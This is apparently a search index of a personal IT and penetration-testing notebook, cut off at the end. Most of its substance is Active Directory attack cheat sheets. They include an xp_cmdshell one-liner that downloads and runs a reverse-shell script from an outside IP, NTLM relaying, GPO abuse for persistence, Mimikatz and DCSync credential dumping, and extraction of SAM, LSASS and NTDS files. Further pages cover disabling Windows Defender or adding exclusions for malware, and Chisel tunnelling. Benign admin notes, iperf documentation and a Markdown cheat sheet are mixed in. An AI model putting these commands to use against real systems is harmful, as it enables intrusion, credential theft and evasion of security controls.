instance,links,customquery | ftGet-SqlServerLinkCrawl -Instance TARGETSERVER -Query 'EXEC xp_cmdshell \"powershell.exe -c iex (new-object net.webclient).downloadstring(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1'')\"' | select instance,links,customquery | ft</p> <p>PowerShell</p> <p>If you have low-privileged access to a MSSQL database and no links are present, you could potentially force NTLM authentication by using the\u00a0<code>xp_dirtree</code>\u00a0stored procedure to access this share. If this is successful, the NetNTLM for the SQL service account can be collected and potentially cracked or relayed to compromise machines as that service account.</p> <p>EXEC master..xp_dirtree \"\\192.168.49.67\\share\"</p> <p>SQL</p> <p>Example command to relay the hash to authenticate as local admin (if the service account has these privileges) and run\u00a0<code>calc.exe</code>. Omit the\u00a0<code>-c</code>\u00a0parameter to attempt a\u00a0<code>secretsdump</code>\u00a0instead.</p> <p>sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c 'calc.exe'</p> <p>Bash</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#abusing-group-policy-objects-for-lateral-movement","title":"Abusing Group Policy Objects for lateral movement","text":"<p>If we identify that we have the permissions to edit and link new Group Policy Objects (GPOs) within the domain (refer to\u00a0\u2018AD Enumeration With PowerView\u2019), we can abuse these privileges to move laterally towards other machines.</p> <p>As an example, we can use the legitimate\u00a0Remote System Administration Tools\u00a0(RSAT) for Windows to create a new GPO, link it to the target, and deploy a registry runkey to add a command that will run automatically the next time the machine boots.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#create-a-new-gpo-and-link-it-to-the-target-server","title":"Create a new GPO and link it to the target server","text":"<p>New-GPO -Name 'Totally Legit GPO' | New-GPLink -Target 'OU=TargetComputer,OU=Workstations,DC=TargetDomain,DC=com'# Link an existing GPO to another target server New-GPLink -Target 'OU=TargetComputer2,OU=Workstations,DC=TargetDomain,DC=com' -Name 'Totally Legit GPO'# Deploy a registry runkey via the GPO Set-GPPrefRegistryValue -Name 'Totally Legit GPO' -Context Computer -Action Create -Key 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ValueName 'Updater' -Value 'cmd.exe /c calc.exe' -Type ExpandString</p> <p>PowerShell</p> <p>We can also use\u00a0SharpGPOAbuse\u00a0to deploy an immediate scheduled task, which will run whenever the group policy is refreshed (every 1\u20132 hours by default). SharpGPOABuse does not create its own GPO objects, so we first have to run the commands for creating and linking GPOs listed above. After this, we can run SharpGPOAbuse to deploy the immediate task.</p> <p>SharpGPOAbuse.exe --AddComputerTask --TaskName \"Microsoft LEGITIMATE Hotfix\" --Author NT AUTHORITY\\SYSTEM --Command \"cmd.exe\" --Arguments \"/c start calc.exe\" --GPOName \"Totally Legit GPO\"</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#post-exploitation","title":"Post-Exploitation","text":""},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#lsass-protection","title":"LSASS protection","text":"<p>Sometimes, LSASS is configured to run as a protected process (PPL). You can query this with PowerShell as follows.</p> <p>Get-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name \"RunAsPPL\"</p> <p>PowerShell</p> <p>If this is the case, you can\u2019t just dump or parse LSASS, and you need to disable the protection with something like\u00a0<code>mimidrv.sys</code>. I won\u2019t discuss how to do that here, but there are tools such as\u00a0PPLDump\u00a0available to help.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#dumping-os-credentials-with-mimikatz","title":"Dumping OS credentials with Mimikatz","text":""},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#dump-logon-passwords","title":"Dump logon passwords","text":"<p>sekurlsa::logonpasswords# Dump all domain hashes from a DC  </p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#note-everything-with-patch-is-noisy-as-heck-since-it-writes-to-lsass","title":"Note: Everything with /patch is noisy as heck since it writes to LSASS \ud83d\udea9","text":"<p>lsadump::lsa /patch# Dump only local users lsadump::sam# DCSync (requires 'ldap' SPN) lsadump::dcsync /user:DOMAIN\\krbtgt /domain:targetdomain.com# Dump Windows secrets, such as stored creds for scheduled tasks (elevate first) \ud83d\udea9 vault::list vault::cred /patch# Dump Kerberos encryption keys, including the AES256 key for better opsec (see 'Lateral Movement with Rubeus' section)  sekurlsa::ekeys</p> <p>Plaintext</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#abusing-the-data-protection-api-dpapi-with-mimikatz","title":"Abusing the Data Protection API (DPAPI) with Mimikatz","text":"<p>Mimikatz has quite some functionality to access Windows\u2019 DPAPI, which is used to encrypt many credentials, including e.g. browser passwords.</p> <p>Note that Mimikatz will automatically cache the master keys that it has seen (check cache with\u00a0<code>dpapi::cache</code>), but this does\u00a0NOT\u00a0work if no Mimikatz session is persisted (e.g. in Cobalt Strike or when using\u00a0<code>Invoke-Mimikatz</code>). More information on using Mimikatz for DPAPI is available\u00a0here.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#find-the-ids-of-protected-secrets-for-a-specific-user","title":"Find the IDs of protected secrets for a specific user","text":"<p>dir C:\\Users[USERNAME]\\AppData\\Local\\Microsoft\\Credentials# Get information, including the used master key ID, from a specific secret (take the path from above) dpapi::cred /in:C:\\Users[USERNAME]\\AppData\\Local\\Microsoft\\Credentials\\1EF01CC92C17C670AC9E57B53C9134F3# IF YOU ARE PRIVILEGED  </p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#dump-all-master-keys-from-the-current-system","title":"Dump all master keys from the current system","text":"<p>sekurlsa::dpapi# IF YOU ARE NOT PRIVILEGED (session as target user required)  </p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#get-the-master-key-from-the-domain-using-rpc-the-path-contains-the-user-sid-and-then-the-id-of-the-masterkey-identified-in-the-previous-step","title":"Get the master key from the domain using RPC (the path contains the user SID, and then the ID of the masterkey identified in the previous step)","text":"<p>dpapi::masterkey /rpc /in:C:\\Users[USERNAME]\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3865823697-1816233505-1834004910-1124\\dd89dddf-946b-4a80-9fd3-7f03ebd41ff4# Decrypt the secret using the retrieved master key  </p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#alternatively-leave-out-masterkey-and-add-unprotect-to-decrypt-the-secret-using-the-cached-master-key-see-above-for-caveats","title":"Alternatively, leave out /masterkey and add /unprotect to decrypt the secret using the cached master key (see above for caveats)","text":"<p>dpapi::cred /in:C:\\Users[USERNAME]]\\AppData\\Local\\Microsoft\\Credentials\\1EF01CC92C17C670AC9E57B53C9134F3 /masterkey:91721d8b1ec[...]e0f02c3e44deece5f318ad</p> <p>Plaintext</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#dumping-secrets-without-mimikatz","title":"Dumping secrets without Mimikatz","text":"<p>We can also parse system secrets without using Mimikatz on the target system directly.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#dumping-lsass","title":"Dumping LSASS","text":"<p>The preferred way to run Mimikatz is to do it locally with a dumped copy of LSASS memory from the target.\u00a0Dumpert,\u00a0Procdump, or other (custom) tooling can be used to dump LSASS memory.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#dump-lsass-memory-through-a-process-snapshot-r-avoiding-interacting-with-it-directly","title":"Dump LSASS memory through a process snapshot (-r), avoiding interacting with it directly","text":"<p>.\\procdump.exe -r -ma lsass.exe lsass.dmp</p> <p>PowerShell</p> <p>After downloading the memory dump file on our attacking system, we can run Mimikatz and switch to \u2018Minidump\u2019 mode to parse the file as follows. After this, we can run Mimikatz\u2019 credential retrieval commands as usual.</p> <p>sekurlsa::minidump lsass.dmp</p> <p>Plaintext</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#dumping-secrets-from-the-registry","title":"Dumping secrets from the registry","text":"<p>We can dump secrets from the registry and parse the files \u201coffline\u201d to get a list of system secrets. \ud83d\udea9</p> <p>On the target, we run the following:</p> <p>reg.exe save hklm\\sam c:\\users\\public\\downloads\\sam.save reg.exe save hklm\\system c:\\users\\public\\downloads\\system.save reg.exe save hklm\\security c:\\users\\public\\downloads\\security.save</p> <p>PowerShell</p> <p>Then on our attacking box we can dump the secrets with Impacket:</p> <p>impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL &gt; secrets.out</p> <p>Bash</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#dumping-secrets-from-a-volume-shadow-copy","title":"Dumping secrets from a Volume Shadow Copy","text":"<p>We can also create a \u201cVolume Shadow Copy\u201d of the\u00a0<code>SAM</code>\u00a0and\u00a0<code>SYSTEM</code>\u00a0files (which are always locked on the current system), so we can still copy them over to our local system. An elevated prompt is required for this.</p> <p>wmic shadowcopy call create Volume='C:\\' copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\sam C:\\users\\public\\sam.save copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\system C:\\users\\public\\system.save</p> <p>PowerShell</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#windows-defender-evasion","title":"Windows Defender evasion","text":"<p>Note: All below commands require administrative privileges on the system!</p> <p>You can query Defender exclusions using PowerShell. If it returns any excluded paths, just execute your malware from there!</p> <p>Get-MpPreference | select-object -ExpandProperty ExclusionPath</p> <p>PowerShell</p> <p>Alternatively, you could add an exclusion directory for your shady stuff. \ud83d\udc40</p> <p>Add-MpPreference -ExclusionPath \"C:\\Users\\Public\\Downloads\\SuperLegitDownloadDirectory\"</p> <p>PowerShell</p> <p>If you\u2019re more aggro, you can disable Defender entirely. It goes without saying that disabling AV/EDR products is never a good idea in practice, best to work around it instead. \ud83d\udea9</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#disable-realtime-monitoring-altogether","title":"Disable realtime monitoring altogether","text":"<p>Set-MpPreference -DisableRealtimeMonitoring $true# Only disables scanning for downloaded files or attachments Set-MpPreference -DisableIOAVProtection $true</p> <p>PowerShell</p> <p>As an alternative to disabling Defender, you can leave it enabled and just remove all virus signatures from it.</p> <p>\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All</p> <p>PowerShell</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#chisel-proxying","title":"Chisel proxying","text":"<p>If you need to proxy traffic over a compromised Windows machine,\u00a0Chisel\u00a0(or\u00a0SharpChisel) is a good choice. Chisel allows port forwarding, but my favorite technique is setting up a reverse SOCKS proxy on the target machine, allowing you to tunnel any traffic over the target system.</p> <p>On our attacking machine (Linux in this case), we start a Chisel server on port 80 in reverse SOCKS5 mode.</p> <p>sudo ./chisel server -p 80 --reverse --socks5</p> <p>Bash</p> <p>Then, on our compromised target system, we connect to this server and tell it to proxy all traffic over it via the reverse SOCKS5 tunnel.</p> <p>.\\chisel.exe client 192.168.49.67:80 R:socks</p> <p>PowerShell</p> <p>A proxy is now open on port 1080 of our linux machine. We can now use e.g. ProxyChains to tunnel over the target system.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#interesting-files","title":"Interesting files","text":"<p>There are lots of files that may contain interesting information. Tools like\u00a0WinPEAS\u00a0or collections like\u00a0PowerSploit\u00a0may help in identifying juicy files (for privesc or post-exploitation).</p> <p>Below is a list of some files I have encountered to be of relevance. Check files based on the programs and/or services that are installed on the machine.</p> <p>In addition, don\u2019t forget to enumerate any local databases with <code>_sqlcmd_</code> or <code>_Invoke-SqlCmd_</code>!</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#all-user-folders","title":"All user folders","text":""},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#limit-this-command-if-there-are-too-many-files","title":"Limit this command if there are too many files ;)","text":"<pre><code>tree /f /a C:\\Users# Web.config  \nC:\\inetpub\\www\\*\\web.config# Unattend files  \nC:\\Windows\\Panther\\Unattend.xml# RDP config files  \nC:\\ProgramData\\Configs\\# Powershell scripts/config files  \nC:\\Program Files\\Windows PowerShell\\# PuTTy config  \nC:\\Users\\[USERNAME]\\AppData\\LocalLow\\Microsoft\\Putty# FileZilla creds  \nC:\\Users\\[USERNAME]\\AppData\\Roaming\\FileZilla\\FileZilla.xml# Jenkins creds (also check out the Windows vault, see above)  \nC:\\Program Files\\Jenkins\\credentials.xml# WLAN profiles  \nC:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\*.xml# TightVNC password (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)  \nGet-ItemProperty -Path HKLM:\\Software\\TightVNC\\Server -Name \"Password\" | select -ExpandProperty Password\n</code></pre>"},{"location":"Boot%20Rec%20Repair/","title":"Boot Rec Repair","text":"<p>bootrec /FixMbr  bootrec /FixBoot  bootrec /ScanOs  bootrec /RebuildBcd</p> <p>sfc /scannow chkdsk /f C: dism /online /cleanup-image /restorehealth</p>"},{"location":"CLI%20Stuff/","title":"CLI Stuff","text":"<pre><code>netsh wlan show profile\nnetsh wlan show profile name= \u201cWi-Fi name\u201d\u00a0key=clear\n</code></pre>"},{"location":"FRS%20to%20DFSR%20Sysvol/","title":"FRS to DFSR Sysvol","text":"<p>In order to proceed with an\u00a0 FRS to DFSR SYSVOL migration, the forest function level must be first configured on your Windows server. If your organization has not done this yet, you must first get the forest and domain function level updated.</p> <p>You can verify if the system uses the FRS using dfsrmig /getglobalstate.</p> <p>1)\u00a0\u00a0\u00a0 Log in to domain controller as Domain admin or Enterprise Admin 2)\u00a0\u00a0\u00a0 Launch powershell console and type\u00a0dfsrmig /getglobalstate.</p> <p>Below output confirms that it has not yet initiated the DFRS migration yet.</p> <p></p> <p>Before proceeding with any configuration changes,\u00a0 we suggest that you familiarize yourself\u00a0 with the migration stage.</p> <p>Below are are four states that correspond with the four migration phases.</p> <p>1)\u00a0\u00a0\u00a0\u00a0State 0\u00a0\u2013 Start 2)\u00a0\u00a0\u00a0\u00a0State 1\u00a0\u2013 Prepared 3)\u00a0\u00a0\u00a0\u00a0State 2\u00a0\u2013 Redirected 4)\u00a0\u00a0\u00a0\u00a0State 3\u00a0\u2013 Eliminated</p> <p>State 0 \u2013 Start</p> <p>With initiating this state, FRS will replicate the SYSVOL folder amongst the domain controllers. It is important to have a current copy of SYSVOL before begins the migration process to avoid any conflicts.</p> <p>State 1 \u2013 Prepared</p> <p>In this state, FRS continues replicating the SYSVOL folder while DFSR will replicate a copy of SYSVOL folder. It will be located in %SystemRoot%\\SYSVOL_DFRS by default. But this SYSVOL will not respond to any other domain controller service requests.</p> <p>State 2 \u2013 Redirected</p> <p>In this state, the DFSR copy of SYSVOL starts to respond for SYSVOL service requests. FRS will continue the replication of its own SYSVOL copy but will not involve with production SYSVOL replication.</p> <p>State 3 \u2013 Eliminated</p> <p>In this state, DFS Replication will continue its replication and servicing SYSVOL requests. Windows will delete original SYSVOL folder users by FRS replication and stop the FRS replication.</p> <p>In order to migrate from FRS to DFSR it must to go from State 1 to State 3. Let\u2019s look into the migration steps in more detail.</p>"},{"location":"FRS%20to%20DFSR%20Sysvol/#prepared-state","title":"Prepared State","text":"<p>Log in to domain controller as Domain admin or Enterprise Admin 2.\u00a0\u00a0\u00a0 Launch PowerShell console 3.\u00a0\u00a0\u00a0 Type dfsrmig /setglobalstate 1 and press enter</p> <p></p> <p>4.\u00a0 Type dfsrmig /getmigrationstate to confirm all domain controllers have reached the prepared state</p> <p></p>"},{"location":"FRS%20to%20DFSR%20Sysvol/#redirected-state","title":"Redirected State","text":"<p>Log in to domain controller as Domain admin or Enterprise Admin 2.\u00a0\u00a0\u00a0 Launch PowerShell console 3.\u00a0\u00a0\u00a0 Type dfsrmig /setglobalstate2 and press enter</p> <p></p> <ol> <li>Type\u00a0dfsrmig /getmigrationstate to confirm all domain controllers have reached redirected state</li> </ol> <p></p>"},{"location":"FRS%20to%20DFSR%20Sysvol/#eliminated-state","title":"Eliminated State","text":"<p>Log in to domain controller as Domain admin or Enterprise Admin 2.\u00a0\u00a0\u00a0 Launch powershell console 3.\u00a0\u00a0\u00a0 Type\u00a0dfsrmig /setglobalstate 3and press enter</p> <p></p> <ol> <li>Type\u00a0dfsrmig /getmigrationstate to confirm all domain controllers have reached eliminated state</li> </ol> <p></p> <p>This completes the migration process and to confirm the SYSVOL share, type net share command and press enter.</p> <p></p> <p>Also make sure in each domain controller FRS service is stopped and disabled.</p> <p></p>"},{"location":"Fix%20Take%20Controll/","title":"Fix Take Controll","text":"<p>[12:13 PM] Ian Kirby so the 'correct' way to fix it, is uncheck the Install take Control box [12:13 PM] Ian Kirby</p> <p> [12:13 PM] Ian Kirby and then there is a .lck file that jams stuff up [12:14 PM] Ian Kirby in c:\\program files (x86)\\beanywhere support express\\getsupportservice_n-central\\ [12:14 PM] Ian Kirby so you delete that whole getsupport fodler [12:15 PM] Ian Kirby and then check the install box and sometimes it works</p>"},{"location":"Free%20RDP%20TLS%20Cert/","title":"Free RDP TLS Cert","text":"<p>https://www.vultr.com/docs/how-to-configure-a-lets-encrypt-tls-certificate-for-windows-remote-desktop/</p>"},{"location":"Hash%20dumping/","title":"Hash dumping","text":"<p>Via CLI from registry - Might trip defender</p> <pre><code>-   reg save HKLM\\sam sam\n-   reg save HKLM\\system system\n-   reg save hklm\\security security\n\n</code></pre> <pre><code>icacls \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\system32\\config\\system\n</code></pre> <p>Check for vss</p> <pre><code>vssadmin list shadows\n</code></pre> <p>from vss</p> <pre><code>powershell.exe -c \"[Console]::OpenStandardInput().CopyTo([Console]::OpenStandardOutput())\" &lt; \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\\Config\\SYSTEM\" &gt; System.copy\n\n</code></pre> <p>Dump secrets with impacket to text file</p> <pre><code>impacket-secretsdump -ntds ntds.dit -system system -security security LOCAL &gt; hashes.txt\n</code></pre> <p>ntdsutil-dumping domain user hashes as DA</p> <pre><code>ntdsutil\nactivate instance ntds\nifm\ncreate full C:\\ntdsutil\nquit\nquit\n</code></pre> <p>followup links:</p> <p>https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ https://www.hackingarticles.in/credential-dumping-domain-cache-credential/ https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials https://tobtu.com/lmntlm.php</p>"},{"location":"Iperf%20Documentation/","title":"Iperf Documentation","text":"<p>https://iperf.fr/iperf-doc.php</p>"},{"location":"Iperf%20Documentation/#iperf-3-user-documentation","title":"iPerf 3 user documentation","text":"<p>GENERAL OPTIONS</p> <p>Command line option</p> <p>Description</p> <p>-p, --port\u00a0n</p> <p>The server port for the server to listen on and the client to connect to. This should be the same in both client and server. Default is 5201.</p> <p>--cport n</p> <p>Option to specify the client-side port. (new in iPerf 3.1)</p> <p>-f, --format\u00a0[kmKM]</p> <p>A letter specifying the format to print bandwidth numbers in. Supported formats are\u00a0</p> <p>'k' = Kbits/sec\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 'K' = KBytes/sec \u00a0\u00a0\u00a0 'm' = Mbits/sec\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 'M' = MBytes/sec</p> <p>The adaptive formats choose between kilo- and mega- as appropriate.</p> <p>-i, --interval\u00a0n</p> <p>Sets the interval time in seconds between periodic bandwidth, jitter, and loss reports. If non-zero, a report is made every\u00a0interval\u00a0seconds of the bandwidth since the last report. If zero, no periodic reports are printed. Default is zero.</p> <p>-F, --file name</p> <p>client-side:\u00a0read from the file and write to the network, instead of using random data; server-side:\u00a0read from the network and write to the file, instead of throwing the data away.</p> <p>-A, --affinity\u00a0n/n,m-F</p> <p>Set the CPU affinity, if possible (Linux and FreeBSD only). On both the client and server you can set the local affinity by using the n form of this argument (where n is a CPU number). In addition, on the client side you can override the server\u2019s affinity for just that one test, using the n,m form of argument. Note that when using this feature, a process will only be bound to a single CPU (as opposed to a set containing potentialy multiple CPUs).</p> <p>-B, --bind\u00a0host</p> <p>Bind to\u00a0host, one of this machine's addresses. For the client this sets the outbound interface. For a server this sets the incoming interface. This is only useful on multihomed hosts, which have multiple network interfaces.</p> <p>-V, --verbose</p> <p>give more detailed output</p> <p>-J, --json</p> <p>output in JSON format</p> <p>--logfile\u00a0file</p> <p>send output to a log file. (new in iPerf 3.1)</p> <p>--d, --debug</p> <p>emit debugging output. Primarily (perhaps exclusively) of use to developers.</p> <p>-v, --version</p> <p>Show version information and quit.</p> <p>-h, --help</p> <p>Show a help synopsis and quit.</p> <p>SERVER SPECIFIC OPTIONS</p> <p>Command line option</p> <p>Description</p> <p>-s, --server</p> <p>Run iPerf in server mode. (This will only allow one iperf connection at a time)</p> <p>-D, --daemon</p> <p>Run the server in background as a daemon.</p> <p>-I, --pidfile_file_</p> <p>write a file with the process ID, most useful when running as a daemon. (new in iPerf 3.1)</p> <p>CLIENT SPECIFIC OPTIONS</p> <p>Command line option</p> <p>Description</p> <p>-c, --client\u00a0host</p> <p>Run iPerf in client mode, connecting to an iPerf server running on\u00a0host.</p> <p>--sctp</p> <p>Use SCTP rather than TCP (Linux, FreeBSD and Solaris). (new in iPerf 3.1)</p> <p>-u, --udp</p> <p>Use UDP rather than TCP. See also the\u00a0-b\u00a0option.</p> <p>-b, --bandwidth\u00a0n[KM]</p> <p>Set target bandwidth to n bits/sec (default 1 Mbit/sec for UDP, unlimited for TCP). If there are multiple streams (-P flag), the bandwidth limit is applied separately to each stream. You can also add a \u2019/\u2019 and a number to the bandwidth specifier. This is called \"burst mode\". It will send the given number of packets without pausing, even if that temporarily exceeds the specified bandwidth limit.</p> <p>-t, --time\u00a0n</p> <p>The time in seconds to transmit for. iPerf normally works by repeatedly sending an array of\u00a0len\u00a0bytes for\u00a0time\u00a0seconds. Default is 10 seconds. See also the\u00a0-l,\u00a0-k\u00a0and\u00a0-n\u00a0options.</p> <p>-n, --num\u00a0n[KM]</p> <p>The number of buffers to transmit. Normally, iPerf sends for 10 seconds. The -n option overrides this and sends an array of\u00a0len\u00a0bytes\u00a0num\u00a0times, no matter how long that takes. See also the\u00a0-l,\u00a0-k\u00a0and\u00a0-t\u00a0options.</p> <p>-k, --blockcount\u00a0n[KM]</p> <p>The number of blocks (packets) to transmit. (instead of -t or -n) See also the\u00a0-t,\u00a0-l\u00a0and\u00a0-n\u00a0options.</p> <p>-l, --length\u00a0n[KM]</p> <p>The length of buffers to read or write. iPerf works by writing an array of\u00a0len\u00a0bytes a number of times. Default is 128 KB for TCP, 8 KB for UDP. See also the\u00a0-n,\u00a0-k\u00a0and\u00a0-t\u00a0options.</p> <p>-P, --parallel\u00a0n</p> <p>The number of simultaneous connections to make to the server. Default is 1.</p> <p>-R, --reverse</p> <p>Run in reverse mode (server sends, client receives).</p> <p>-w, --window\u00a0n[KM]</p> <p>Sets the socket buffer sizes to the specified value. For TCP, this sets the TCP window size. (this gets sent to the server and used on that side too)</p> <p>-M, --set-mss\u00a0n</p> <p>Attempt to set the TCP maximum segment size (MSS). The MSS is usually the MTU - 40 bytes for the TCP/IP header. For ethernet, the MSS is 1460 bytes (1500 byte MTU).</p> <p>-N, --no-delay</p> <p>Set the TCP no delay option, disabling Nagle's algorithm. Normally this is only disabled for interactive applications like telnet.</p> <p>-4, --version4</p> <p>only use IPv4.</p> <p>-6, --version4</p> <p>only use IPv6.</p> <p>-S, --tos\u00a0n</p> <p>The type-of-service for outgoing packets. (Many routers ignore the TOS field.) You may specify the value in hex with a '0x' prefix, in octal with a '0' prefix, or in decimal. For example, '0x10' hex = '020' octal = '16' decimal. The TOS numbers specified in RFC 1349 are:\u00a0</p> <p>IPTOS_LOWDELAY\u00a0\u00a0\u00a0\u00a0 minimize delay\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 0x10 \u00a0\u00a0\u00a0 IPTOS_THROUGHPUT\u00a0\u00a0 maximize throughput\u00a0\u00a0 0x08 \u00a0\u00a0\u00a0 IPTOS_RELIABILITY\u00a0 maximize reliability\u00a0 0x04 \u00a0\u00a0\u00a0 IPTOS_LOWCOST\u00a0\u00a0\u00a0\u00a0\u00a0 minimize cost\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 0x02</p> <p>-L, --flowlabel\u00a0n</p> <p>Set the IPv6 flow label (currently only supported on Linux).</p> <p>-Z, --zerocopy</p> <p>Use a \"zero copy\" method of sending data, such as sendfile(2), instead of the usual write(2). This uses much less CPU.</p> <p>-O, --omit\u00a0n</p> <p>Omit the first n seconds of the test, to skip past the TCP\u00a0TCP slowstart\u00a0period.</p> <p>-T, --title\u00a0_str_</p> <p>Prefix every output line with this string.</p> <p>-C, --linux-congestion\u00a0algo</p> <p>Set the\u00a0congestion control algorithm\u00a0(Linux only for iPerf 3.0, Linux and FreeBSD for iPerf 3.</p>"},{"location":"Markdown/","title":"Markdown Cheat Sheet","text":"<p>Thanks for visiting The Markdown Guide!</p> <p>This Markdown cheat sheet provides a quick overview of all the Markdown syntax elements. It can\u00e2\u20ac\u2122t cover every edge case, so if you need more information about any of these elements, refer to the reference guides for basic syntax and extended syntax.</p>"},{"location":"Markdown/#basic-syntax","title":"Basic Syntax","text":"<p>These are the elements outlined in John Gruber\u00e2\u20ac\u2122s original design document. All Markdown applications support these elements.</p>"},{"location":"Markdown/#heading","title":"Heading","text":""},{"location":"Markdown/#h1","title":"H1","text":""},{"location":"Markdown/#h2","title":"H2","text":""},{"location":"Markdown/#h3","title":"H3","text":""},{"location":"Markdown/#bold","title":"Bold","text":"<p>bold text</p>"},{"location":"Markdown/#italic","title":"Italic","text":"<p>italicized text</p>"},{"location":"Markdown/#blockquote","title":"Blockquote","text":"<p>blockquote</p>"},{"location":"Markdown/#ordered-list","title":"Ordered List","text":"<ol> <li>First item</li> <li>Second item</li> <li>Third item</li> </ol>"},{"location":"Markdown/#unordered-list","title":"Unordered List","text":"<ul> <li>First item</li> <li>Second item</li> <li>Third item</li> </ul>"},{"location":"Markdown/#code","title":"Code","text":"<p><code>code</code></p>"},{"location":"Markdown/#horizontal-rule","title":"Horizontal Rule","text":""},{"location":"Markdown/#link","title":"Link","text":"<p>Markdown Guide</p>"},{"location":"Markdown/#image","title":"Image","text":""},{"location":"Markdown/#extended-syntax","title":"Extended Syntax","text":"<p>These elements extend the basic syntax by adding additional features. Not all Markdown applications support these elements.</p>"},{"location":"Markdown/#table","title":"Table","text":"Syntax Description Header Title Paragraph Text"},{"location":"Markdown/#fenced-code-block","title":"Fenced Code Block","text":"<pre><code>{\n  \"firstName\": \"John\",\n  \"lastName\": \"Smith\",\n  \"age\": 25\n}\n</code></pre>"},{"location":"Markdown/#footnote","title":"Footnote","text":"<p>Here's a sentence with a footnote. 1</p>"},{"location":"Markdown/#heading-id","title":"Heading ID","text":""},{"location":"Markdown/#my-great-heading-custom-id","title":"My Great Heading {#custom-id}","text":""},{"location":"Markdown/#definition-list","title":"Definition List","text":"term definition"},{"location":"Markdown/#strikethrough","title":"Strikethrough","text":"<p>The world is flat.</p>"},{"location":"Markdown/#task-list","title":"Task List","text":"<ul> <li> Write the press release \u2705 2022-10-17</li> <li> Update the website</li> <li> Contact the media</li> </ul>"},{"location":"Markdown/#emoji","title":"Emoji","text":"<p>That is so funny! :joy:</p> <p>(See also Copying and Pasting Emoji)</p>"},{"location":"Markdown/#highlight","title":"Highlight","text":"<p>I need to highlight these very important words.</p>"},{"location":"Markdown/#subscript","title":"Subscript","text":"<p>H2O</p>"},{"location":"Markdown/#superscript","title":"Superscript","text":"<p>X2</p> <ol> <li> <p>This is the footnote.\u00a0\u21a9</p> </li> </ol>"},{"location":"Next%20Cloud%20Setup%20notes/","title":"Next Cloud Setup notes","text":"<p>Config path on TKL image: /var/www/nextcloud/config</p>"},{"location":"Obsidian/","title":"Obsidian","text":""},{"location":"Obsidian/#learning-videos","title":"Learning videos","text":"<p>https://www.youtube.com/watch?v=QgbLb6QCK88 https://www.youtube.com/watch?v=OUrOfIqvGS4 https://www.youtube.com/watch?v=1qB2-ciYlt4 https://www.youtube.com/watch?v=njibNuFQwjw</p>"},{"location":"Onsites/","title":"Onsites","text":"<p>Start Checking in with service coordinator before leaving site.</p>"},{"location":"Pivoting%20and%20tunneling/","title":"Pivoting and Tunneling for OSCP and beyond (Cheat Sheet)","text":"<p>This is a cheat sheet for pivoting and tunneling using many common tools.</p> <p><code>ifconfig</code></p> <p>Linux-based command that displays all current network configurations of a system.</p> <p><code>ipconfig</code></p> <p>Windows-based command that displays all system network configurations.</p> <p><code>netstat -r</code></p> <p>Command used to display the routing table for all IPv4-based protocols.</p> <p><code>nmap -sT -p22,3306 &lt;IPaddressofTarget&gt;</code></p> <p>Nmap command used to scan a target for open ports allowing SSH or MySQL connections.</p> <p><code>ssh -L 1234:localhost:3306 Ubuntu@&lt;IPaddressofTarget&gt;</code></p> <p>SSH comand used to create an SSH tunnel from a local machine on local port <code>1234</code> to a remote target using port 3306.</p> <p><code>netstat -antp | grep 1234</code></p> <p>Netstat option used to display network connections associated with a tunnel created. Using <code>grep</code> to filter based on local port <code>1234</code> .</p> <p><code>nmap -v -sV -p1234 localhost</code></p> <p>Nmap command used to scan a host through a connection that has been made on local port <code>1234</code>.</p> <p><code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@&lt;IPaddressofTarget&gt;</code></p> <p>SSH command that instructs the ssh client to request the SSH server forward all data via port <code>1234</code> to <code>localhost:3306</code>.</p> <p><code>ssh -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></p> <p>SSH command used to perform a dynamic 